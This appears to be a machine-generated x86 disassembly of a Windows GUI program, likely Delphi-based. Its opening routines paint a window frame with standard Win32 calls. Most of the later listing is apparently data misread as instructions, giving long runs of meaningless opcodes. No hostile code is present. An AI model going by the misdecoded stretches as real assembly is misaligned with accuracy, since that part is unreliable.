mov [ ecx + 0x4 ] 0x24
mov eax 0x67
jmp r-xdata
mov [ ecx + 0x4 ] 0x25
mov eax 0x68
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_4404bc
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
push 0xffffffec
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
call GetWindowRect
mov eax [ ebp - 0x24 ]
neg eax
push eax
mov eax [ ebp - 0x28 ]
neg eax
push eax
lea eax [ ebp - 0x28 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_440617
push [ fs : edx ]
mov [ fs : edx ] esp
push esi
lea esi [ ebp - 0x28 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
test bl bl
je r-xdata
mov eax [ ebp - 0x1c ]
sub eax 0x2
push eax
mov eax [ ebp - 0x20 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x24 ]
add eax 0x2
push eax
mov eax [ ebp - 0x28 ]
add eax 0x2
push eax
mov eax [ ebp - 0x8 ]
push eax
call ExcludeClipRect
lea ecx [ ebp - 0x34 ]
mov dl 0x2
mov eax esi
call sub_4400f4
lea eax [ ebp - 0x28 ]
push eax
push 0x0
lea ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_43ff60
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
call ReleaseDC
retn
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
call GetWindowLongA
test eax 0x100000
je r-xdata
test eax 0x200000
je r-xdata
push 0x2
call GetSystemMetrics
mov edi eax
push 0x3
call GetSystemMetrics
mov ebx eax
push 0xfffffffe
push 0xfffffffe
lea eax [ ebp - 0x18 ]
push eax
call InflateRect
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x44 ]
push eax
mov edx [ ebp - 0xc ]
sub edx ebx
mov eax [ ebp - 0x10 ]
sub eax edi
mov ecx [ ebp - 0x10 ]
call sub_416c50
push esi
lea esi [ ebp - 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push 0xf
call GetSysColorBrush
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FillRect
sub_440644
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44067f
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440686
retn
mov eax [ rw-data ]
call sub_403174
mov eax rw-data
call sub_403eec
sub_440884
sub [ ecx ] dh
inc eax
add al al
push eax
inc ebp
add [ eax ] ch
test [ eax + eax + 0x20 ] 0x700044eb
mov eax [ ecx ]
js r-xdata
enter 0x44 0xc0
clc
inc esp
add ah ch
clc
inc esp
add [ eax + 0x3c004444 ] al
0x44
inc esp
add [ eax + 0x45 ] ah
inc esp
add [ eax - 0x36 ] dh
inc esp
add [ esp + edx * 8 ] bl
inc esp
add [ eax + 0x11 ] dl
inc edx
add [ eax ] bh
push cs
inc edx
add [ eax ] dh
push cs
inc edx
add [ eax + 0x11 ] bl
inc edx
add [ eax + 0x40 ] ah
inc esp
add [ eax - 0x4bffbb1b ] bh
in eax 0x44
add [ esi - 0x3687ffbc ] al
inc esp
add [ eax + edx * 8 - 0x2fdfffbc ] bh
inc esp
add [ eax - 0x27 ] cl
inc esp
add al al
enter 0x44 0xc4
sub_4408f1
aad 0x44
add [ eax ] cl
aad 0x44
add [ eax + ebx * 8 ] bl
inc esp
add al cl
salc
inc esp
add [ eax + ebp * 8 - 0x68fffbc ] dh
inc esp
add [ eax ] cl
fild [ eax + eax + 0x7c ]
fild [ eax + eax - 0x10 ]

sub_440a35
aad 0x44
add [ eax ] cl
aad 0x44
add [ eax + ebx * 8 ] bl
inc esp
add al cl
salc
inc esp
add [ eax + ebp * 8 - 0x68fffbc ] dh
inc esp
add [ eax ] cl
fild [ eax + eax + 0x7c ]
fild [ eax + eax - 0x10 ]

sub_440a56
inc esp
add [ ebx + ebx * 8 + 0x44 ] bl
add [ edx + eax * 2 + 0x44 ] bh
add al bh
inc eax
inc esp
add [ esi ] al
push esp
dec esp
popad
bound esp [ ebp + 0x6c ]
nop
jo r-xdata
ror [ ecx ] 0x1
inc esp
add [ ecx + ecx + 0x44 ] bl
add [ edx ] dh
add [ eax ] cl
push ebx
je r-xdata
inc esp
add [ edi ] al
push es
push esp
dec esp
popad
bound esp [ ebp + 0x6c ]
add [ edi ] al
inc ecx
outsb
inc ebx
je r-xdata
add al dh
xlat
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050011 ] al
outsd
insb
outsd
jb r-xdata
add [ eax ] dl
inc eax
add [ ebp + 0x1 ] ch
add bh bh
pop esp
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push cs
add [ eax ] cl
inc ecx
jne r-xdata
insb
jae r-xdata
add [ eax - 0x80000000 ] al
str [ eax ]
inc edx
mov [ eax + eax + 0x74 ] al
add [ eax ] al
dec [ eax ]
sti
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0012 ] al
outsd
outsb
jae r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0xa065646f
xchg [ eax + eax + 0x34 ] eax
salc
inc esp
add [ esi + edx * 8 + 0x44 ] ah
add [ eax ] dh
test [ eax + eax ] 0x0
add [ eax - 0x80000000 ] al
adc [ eax ] al
pop es
inc ebx
popad
jo r-xdata
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
pop eax
xlat
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000f ] al
arpl [ eax + 0x6f ] bp
jb r-xdata
add bh bh
inc esp
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al 0x0
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
add al 0x88
inc esp
add [ ecx ] ah
add bh bh
mov cl cl
inc esp
add [ edx + ecx * 8 ] ah
inc esp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or eax 0x6e410700
add al dl
add [ eax + eax + 0x5b ] 0x0
add bh bh
dec eax

add bh bh
fwait
add [ eax ] al
inc [ ecx ]
imul ebp [ edi + 0x6e ] sub_422004
jo r-xdata
add [ eax ] dl
add dh bh
add [ fs : eax ] al
jb r-xdata
add bh bh
aam 0xd7
inc esp
add [ eax ] al
add [ 0x72440800 ] dl
popad
dec ebp
outsd
add [ gs : eax ] dl
inc eax
imul ebp [ esi + 0x74 ] 0x4480b873
add [ edx ] bh
add bh bh
jpe r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc eax [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
[ eax + 0x1004444 ]
jae r-xdata
add bh bh
test al 0x44
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x460c0017 ] al
outsd
arpl [ ebp + 0x73 ] si
inc ebx
outsd
outsb
je r-xdata
jb r-xdata
inc eax
add [ ecx ] bl
add bh bh
pushad
xlat
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax [ eax ]
or dl [ eax + 0x61 ]
outsd
insb
movsb [ edi ] [ esi ]
and al 0x42
add [ eax ] ch
add bh bh
sub bh dl
inc esp
add [ eax ] bh
xlat
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040018 ] al
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push ss
add [ edi ] al
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
test [ ebx + 0x1680044 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
xchg [ eax + eax - 0x65 ] eax
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax + 0x1 ] al
outsb
je r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
adc [ eax ] al
pushfd
inc esp
inc esp
add al bl
inc esp
inc esp
add [ eax + 0xff0001 ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x540b0020 ] al
jb r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
add [ eax ] al
and eax [ eax ]
or [ edi + 0x6f ] dl
jb r-xdata
outsb
jae r-xdata
je r-xdata
jo r-xdata
adc [ eax ] al
0xa8ff0000 0x44d7
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al 0x0
push cs
push eax
popad
jb r-xdata
add [ eax ] al
push edi
add [ eax ] eax
jmp [ eax ]
popad
jb r-xdata
or [ eax + eax + 0x6e ] al
add [ eax ] eax
[ eax * 2 + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ eax ] eax
push es
dec esp
popad
jns r-xdata
je r-xdata
outsb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001f ] al
push 0x6948776f
outsb
outsb
je r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
jb r-xdata
jo r-xdata
jb r-xdata
outsb
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0e00
jne r-xdata
adc [ eax ] al
jo r-xdata
inc eax
add [ ecx - 0x7b010000 ] bl
xlat
inc esp
add [ edi + edx * 8 + 0x44 ] cl
add [ eax ] dl
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
add [ eax + 0x4f09002d ] al
outsb
dec ebp
outsd
jne r-xdata
push 0xd0004489
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
mov [ eax + eax - 0x30 ] eax
jo r-xdata
popad
push ebp
inc ecx
add [ eax ] ah
add [ eax ] al
js r-xdata
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0025 ] al
outsb
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
push esp
aad 0x44
add [ eax + 0x44f6 ] dh
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
outsd
add [ eax ] eax
push ds
add [ 0x776f6853 ] cl
inc ecx
arpl [ ebx + 0x65 ] sp
insb
inc ebx
push 0x10007261
add bh bh
mov esp 0x1004444
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
jb r-xdata
push eax
popad
jo r-xdata
mov [ ebp ] 0xff00007c
in al dx
aad 0x44
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009001d ] al
outsd
inc esp
outsd
arpl [ ebx - 0x4c ] bp
mov eax [ eax + eax + 0x10 ]
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0031 ] al
outsb
push ebp
jo r-xdata
je r-xdata
inc esp
outsd
ja r-xdata
and [ esi ] 0x0
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe9430e85
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0027 ] al
outsb
inc esp
jb r-xdata
add [ eax + 0x4f0a0028 ] al
outsb
inc esp
mov al [ eax + eax - 0x10 ]
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002b ] al
add [ eax ] al
dec edi
cld
push eax
outsd
jo r-xdata
inc ebp
jbe r-xdata
jb r-xdata
push ebp
inc ecx
add [ eax - 0x7f00ffff ] al
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002e ] al
outsb
dec ebp
outsd
jne r-xdata
push ebx
je r-xdata
xor [ ecx ] 0x0
or ecx [ edi + 0x6e ]
jb r-xdata
loopne r-xdata
outsb
dec ebp
outsd
jne r-xdata
jb r-xdata
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090029 ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x4 ] bp
mov eax [ eax + eax + 0x18 ]
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
dec ebp
popad
outsb
je r-xdata
inc ebx
outsd
outsb
je r-xdata
inc esp
jb r-xdata
inc ebp
outsb
inc esp
add al bl
add [ eax ] al
push ebp
inc ecx
add [ eax + 0x1 ] bh
add bh bh
js r-xdata
jb r-xdata
jbe r-xdata
mov eax [ eax + eax + 0x8 ]
add [ gs : eax ] dl
inc eax
add [ edi + 0x1 ] ch
add bh bh
cmp [ ebp + 0x44 ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push ebp
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
add [ eax ] al
add [ edi + ebx * 2 + 0x33a40041 ] cl
inc eax
add [ eax - 0x4bffbfcd ] dh
xor eax [ eax ]
mov eax 0xac004033
jb r-xdata
add al 0x8
jb r-xdata
outsd
insb
add [ 0x65646e49 ] al
pop es
inc ebx
outsd
outsb
je r-xdata
add [ eax + ecx ] al
sbb al 0x10
inc esp
add [ ebx ] al
or eax 0x69644554
je r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002f ] al
outsb
dec ebp
outsd
jne r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ edi + ecx * 2 ] cl
cmp [ ecx ] dl
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
dec ecx
je r-xdata
jb r-xdata
outsd
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
or al 0x31
insb
add [ 0x65646e49 ] al
js r-xdata
adc [ edx + edx * 2 ] al
dec ecx
outsb
add [ eax ] cl
push 0x61437261
jae r-xdata
arpl [ gs : esi + 0x6f ] cx
jb r-xdata
dec esp
popad
jbe r-xdata
add [ eax - 0x57ffbfd7 ] ch
sub [ eax ] eax
jl r-xdata
inc esp
add [ ebx + edx + 0x45 ] dl
add [ eax + 0x13 ] bl
inc ebp
add [ ebx + ecx * 2 ] ah
inc esp
add [ eax + 0x30004511 ] bh
inc ebp
add [ eax ] al
sbb al 0x45
add [ eax + edx * 2 ] ah
inc ebp
add [ edx + edi + 0x3d9c0045 ] ch
inc ebp
add [ edi + edx * 2 + 0x44 ] dl
add ah dl
dec ebx
inc esp
add [ eax ] al
dec esp
inc esp
add [ eax + 0x57 ] ch
inc esp
add al bh
dec edx
inc esp
add [ eax - 0x63ffbbaa ] dl
push esi
inc esp
add [ eax ] ch
push edi
inc esp
add [ esi + ecx * 4 ] al
inc ebp
add [ eax + 0x4b ] cl
inc esp
add [ eax + 0x78004455 ] dh
dec esi
inc esp
inc eax
add [ eax ] ch
xor [ eax ] eax
pushfd
inc esp
add [ eax ] bh
adc [ edx ] eax
mov al 0x33
inc eax
add [ edx + ecx + 0x33b80042 ] cl
inc eax
add [ ecx + ebx + 0x310c0045 ] dl
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
adc [ eax + eax + 0x14 ] eax
add [ eax ] al
add [ eax ] al
insd
inc ebp
jbe r-xdata
xor eax [ eax ]
mov ah 0x33
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
add [ esi ] eax
dec ecx
outsb
je r-xdata
jb r-xdata
je r-xdata
outsd
jb r-xdata
jae r-xdata
pushad
inc eax
add [ ebx + 0x4410d8c0 ] cl
ja r-xdata
js r-xdata
add eax 0x65646e49
add [ eax ] eax
add [ eax ] al
add [ edx ] al
push ebx
je r-xdata
popad
insb
or esp [ ebp + 0x63 ]
push ebp
jo r-xdata
add [ eax ] al
add [ eax ] bl
adc [ eax + eax + 0x8 ] al
mov esp 0x448d
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0030 ] al
outsb
push ebx
je r-xdata
inc esp
add [ ebp + edx * 2 + 0x44 ] cl
add [ eax + 0x2c004454 ] dh
push ebp
inc esp
add al bh
push esp
inc esp
add [ esp + edx * 2 ] cl
inc ebx
jne r-xdata
inc esp
add [ eax + 0x60004029 ] ch
push edi
inc esp
add [ esi + edx * 2 + 0x44 ] ch
add [ 0x4000100 ] cl
mov al 0x10
mov al 0x11
mov ebp 0x2c002b
sub eax 0xb3008700
push [ edx - 0x4f004e01 ]
push [ ebp + 0x444c8cff ]
add ah ch
dec esp
inc esp
add [ eax ] al
dec ebp
inc esp
add [ edx + edx * 2 + 0x44 ] ah
add [ eax - 0x47ffbbb4 ] dh
dec esp
inc esp
add al al
dec esp
inc esp
add al cl
dec esp
inc esp
add al dl
push ebx
inc edx
add [ eax - 0x73ffbfcd ] dh
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
adc eax [ eax + eax - 0xc ]
adc eax [ eax + eax + 0x64 ]
add al [ eax ]
je r-xdata
add [ eax ] al
cld
outsb
je r-xdata
inc eax
add [ edi + edx * 4 ] al
inc ecx
add [ eax + 0x47 ] ah
inc esp
add [ eax - 0x57ffbe66 ] dl
inc esi
inc esp
add ah al
inc esi
inc esp
add al dh
0xa0180041 0x41
cmp al 0x47
inc esp
add [ ecx - 0x5dc3ffbf ] dh
inc ecx
add [ eax + 0x48 ] dh
inc esp
add [ eax ] dh
movsb [ edi ] [ esi ]
inc ecx
add [ esi + edx * 4 ] al
inc ecx
add [ eax ] ch
xchg esi eax
inc ecx
add [ esi + edx * 4 + 0x41 ] cl
add [ eax + 0x28004447 ] bh
dec eax
inc esp
add [ eax - 0x63ffbe67 ] ch
0x48480041 0x44
xor [ ebp - 0x61fbffbf ] bl
inc ecx
add [ eax + 0x38004029 ] ch
sahf
inc ecx
add [ eax - 0x62 ] ch
inc ecx
add [ esi + ebx * 4 - 0x6097ffbf ] bh
inc ecx
add [ eax ] al
mov eax [ 0xffffffffa1580041 ]
inc ecx
add ah ch
mov eax [ 0x54160041 ]
inc ebx
jne r-xdata
jb r-xdata
add [ eax ] ch
xor [ eax ] eax
aam 0x95
inc ecx
add [ esp + ecx * 4 + 0x41 ] dl
add [ eax + ebx * 4 ] cl
inc ecx
jb r-xdata
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push es
je r-xdata
push 0x6e490774
andps xmm1 [ edi + 0x77 ]
outsb
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + eax + 0x5 ] si
add al 0x52
jb r-xdata
je r-xdata
jb r-xdata
jb r-xdata
or esp [ ebp + 0x63 ]
dec esp
outsd
ja r-xdata
jb r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x4f736310
ja r-xdata
je r-xdata
sbb [ ebp ] eax
or al 0x31
xor eax [ eax ]
xchg esp eax
imul ebp [ esi + 0x67 ] 0x12189073
inc esp
add [ edi ] al
push ss
push esp
inc ebx
jne r-xdata
add ecx [ eax ]
pop es
inc ebx
outsd
outsb
je r-xdata
test [ ebx + 0x10540044 ] bl
inc eax
outsb
je r-xdata
ja r-xdata
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x65 ] edx
popad
insd
popad
jae r-xdata
jb r-xdata
push cs
push esp
inc esp
jb r-xdata
mov eax eax
push 0x8004410
sub [ ecx ] dh
inc eax
add [ eax + ebx * 2 + 0x44 ] al
jb r-xdata
ja r-xdata
insd
inc ebx
outsd
insd
bound ebp [ edi - 0x73 ]
inc eax
add [ eax ] cl
adc al 0x44
add [ edi ] al
or al 0x54
inc ebx
jne r-xdata
dec edx
inc esp
add [ ecx + ecx * 2 ] dh
je r-xdata
inc eax
add [ eax - 0x53ffbfcd ] bh
outsd
je r-xdata
push esp
dec edi
ja r-xdata
je r-xdata
popad
jae r-xdata
or [ eax ] al
adc al 0x0
or [ eax - 0x43d343d5 ] esi
add [ edx ] eax
sldt [ ebx - 0x13004600 ]
pop edx
inc esp
add [ ecx * 2 + 0x61e40044 ] ah
inc esp
add [ edx + 0x62e80044 ] bh
inc esp
add [ ebx + 0x65f40044 ] bh
inc esp
add [ esp + ebx * 2 ] dh
inc esp
add [ edi ] cl
push esp
inc ebx
jne r-xdata
add [ eax ] al
add [ ecx + ecx * 2 ] dh
push ss
inc esp
add [ esi + edx + 0x44 ] cl
jb r-xdata
inc eax
add [ ecx + ebx + 0x310c0045 ] dl
adc esp [ ebx + 0x73 ]
je r-xdata
inc ebp
add [ ecx + edx + 0x45 ] bl
add [ eax - 0x75 ] dh
add [ edx + ecx * 2 + 0x49340044 ] bl
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
jb r-xdata
je r-xdata
add [ eax + edx + 0x40 ] dl
add [ ebx + 0x44117cc0 ] cl
inc esp
add [ eax + edx + 0x40 ] dl
jb r-xdata
popad
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
xchg esp eax
je r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
pop eax
inc esp
xchg esp eax
ja r-xdata
inc esp
add [ eax ] dl
inc [ eax + eax + 0x1c ]
aam 0x44
add [ eax + 0x11 ] dl
inc edx
add [ eax ] bh
push cs
mov eax [ ecx ]
rcl [ esp + eax * 2 ] 0x1
add al 0xcb
jb r-xdata
dec edi
ja r-xdata
adc esp [ fs : ebx + 0x73 ]
insd
inc ebx
outsd
insd
bound ebp [ edi - 0x6c ]
adc al [ eax + eax - 0x1c ]
mov [ 0xb0044 ] eax
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
or al [ edx ]
mov eax 0x94004033
je r-xdata
push esp
adc [ eax ] al
push esp
adc [ eax ] al
mov eax eax
jl r-xdata
add [ ebx + ebx * 4 + 0x10540044 ] al
inc eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x3f74ffc0 ] bh
fcom [ eax ]
inc esp
mov eax eax
insb
jae r-xdata
add [ eax ] al
sbb al 0x45
add [ eax + edx * 2 ] ah
inc ebp
add [ edx + edi + 0x3d9c0045 ] ch
inc ebp
add [ edi + edx * 2 + 0x44 ] dl
add ah dl
dec ebx
inc esp
add [ eax ] al
dec esp
inc esp
add [ eax + 0x57 ] ch
inc esp
add al bh
dec edx
inc esp
add [ eax - 0x63ffbbaa ] dl
push esi
inc esp
add [ eax ] ch
push edi
inc esp
add [ esi + ecx * 4 ] al
inc ebp
add [ eax + 0x4b ] cl
inc esp
add [ eax + 0x78004455 ] dh
dec esi
inc esp
add [ ebx + 0x58d40044 ] dh
inc esp
add [ esp + ecx * 2 + 0x44 ] bh
add [ eax + 0x60004463 ] ch
push edi
inc esp
add [ esi + edx * 2 + 0x44 ] ch
inc esp
add [ eax ] dh
inc ebp
rol [ eax ] 0x18
inc esp
add [ edi ] al
or [ ebx + eax * 2 + 0x6f ] edx
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
pop eax
inc esp
add [ ecx + ecx * 2 ] dh
inc ebp
add [ ecx + edx + 0x45 ] bl
inc eax
add [ ecx + ebx + 0x310c0045 ] dl
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
add [ edx + eax + 0x12480000 ] dl
inc esp
add [ eax ] bh
imul edi [ eax + 0x65 ] 0x73631364
sbb [ ebp ] eax
or al 0x31
inc edx
add [ eax - 0x73ffbfcd ] dh
or al [ edx ]
mov eax 0x94004033
jb r-xdata
inc ebx
je r-xdata
insb
jae r-xdata
inc ecx
add al dl
push esp
imul ebp [ esi + 0x67 ] 0x44117c73
add [ eax + 0x41 ] dh
add [ eax ] al
add [ eax ] cl
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
adc al [ eax + eax ]
inc esp
shr [ eax + 0x10 ] 0x44
add ah dh
push ebx
inc esp
add ah al
popad
inc esp
add [ eax + ebx * 2 + 0x54090044 ] dl
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
insb
push esi
inc esp
push ss
inc esp
add [ esi + edx + 0x44 ] bl
add [ ebp ] al
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
sbb [ ebp ] eax
or al 0x31
or al [ edx ]
mov eax 0x94004033
push ss
inc ebp
add [ ecx + edx + 0x45 ] bl
add [ eax - 0x75 ] dh
inc ecx
add al dl
push esp
dec ecx
ja r-xdata
inc edx
add [ eax ] dh
push cs
inc edx
add [ eax + 0x11 ] bl
inc edx
add al al
push edi
inc esp
add [ eax + 0x44 ] cl
inc ebp
add [ ecx + ecx * 2 + 0x45 ] ah
add [ eax + 0x78004548 ] dh
leave
inc esp
add ah al
inc ebp
add ah ah
inc ebp
add ah bh
cmp eax [ ebp ]
ror al 0x44
add ah al
enter 0x44 0xc0
clc
inc esp
add ah ch
clc
inc esp
add [ esp + edx * 8 ] al
inc esp
add [ edx + ecx * 8 ] bh
inc esp
add [ eax + 0x80044d5 ] dl
aad 0x44
add [ eax + ebx * 8 ] bl
inc esp
add al cl
salc
inc esp
add [ eax + 0x63 ] ah
inc esp
add [ eax - 0x7 ] dh
inc esp
add [ eax + 0x3c ] dl
inc ebp
add [ edi + 0x38080045 ] cl
inc ebp
add al dh
cmp al 0x45
add [ eax + 0x1c0044fe ] cl
add eax 0x12bc0045
inc ebp
add al bh
pop eax
inc esp
add [ edi + ecx + 0x595c0045 ] ah
inc esp
add [ ebx + edx + 0x45 ] dl
add [ eax + 0x13 ] bl
inc ebp
add [ ebx + ecx * 2 ] ah
inc esp
add [ edx + ebx * 2 + 0x3e300044 ] bl
inc ebp
add [ eax ] al
sbb al 0x45
add [ eax + edx * 2 ] ah
inc ebp
add [ edx + edi + 0x3d9c0045 ] ch
inc ebp
add [ edi + edx * 2 + 0x44 ] dl
add ah dl
dec ebx
inc esp
add [ eax ] al
dec esp
inc esp
add [ eax + 0x57 ] ch
inc esp
add al bh
dec edx
inc esp
add [ eax - 0x63ffbbaa ] dl
push esi
inc esp
add [ eax ] ch
push edi
inc esp
add [ esi + ecx * 4 ] al
inc ebp
add [ eax + 0x4b ] cl
inc esp
add [ eax + 0x78004455 ] dh
dec esi
inc esp
add [ ebx + 0x58d40044 ] dh
inc esp
add [ esp + ecx * 2 + 0x44 ] bh
add [ eax + 0x60004463 ] ch
push edi
inc esp
add [ esi + edx * 2 + 0x44 ] ch
add ah dh
push ebx
inc esp
add ah al
popad
inc esp
add [ eax + ebx * 2 + 0xe0044 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
jo r-xdata
insb
jae r-xdata
add [ eax + r-xdata ] dl
add ecx [ esi ]
push esp
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
inc esp
add [ ebx + ecx * 8 ] al
inc esp
add [ eax ] dl
inc [ eax + eax + 0x1c ]
aam 0x44
add [ eax + 0x11 ] dl
inc edx
inc ebx
je r-xdata
insb
outsd
jae r-xdata
insb
jae r-xdata
add [ eax - 0x75 ] dh
inc ecx
add al dl
push esp
inc esp
outsd
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
popad
shr ah 0x14
inc esp
add [ eax ] al
